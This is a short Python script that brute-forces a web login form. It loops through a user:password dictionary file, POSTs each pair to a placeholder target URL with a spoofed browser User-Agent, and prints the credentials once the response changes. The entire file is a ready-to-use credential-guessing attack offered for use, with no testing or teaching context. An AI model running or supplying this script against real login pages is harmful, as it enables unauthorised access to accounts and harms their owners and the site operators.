import requests

# Brute forcing a POST request login with a dictionary in this format   user:password
dictionary = open("mydict.txt", "r").read().split("\n")
url = "http://targeturl:targetport/" # URL to attack
myheaders = {'User-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.2651.74'} 
mydata = {
    "username": "",
    "pass": "",
}

i = 0
while i < len(dictionary):
    part = dictionary[i].split(":") # If user:password format, adjust as necessary
    mydata["username"] = part[0]
    if (len(part) < 2):
        mydata["pass"] = "" # User without password case
    else:
        mydata["pass"] = part[1]

    x = requests.post(url, headers=myheaders, data=mydata) #

    if ("Error" not in x.text) or (len(x.content) != 1234): # Adjust conditions to end
        print(x.text) # Show content 
        print("Found in position: " + str(i)) # Show info
        print("Username: " + part[0] + " ; " + "Password: " + part[1])
        i = len(dictionary) # Loop end condition

    i = i + 1



